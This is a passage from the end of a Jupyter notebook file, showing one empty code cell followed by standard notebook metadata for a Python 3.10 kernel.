   "id": "b5eeca21-1da7-42d2-8306-950bb6490fd3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
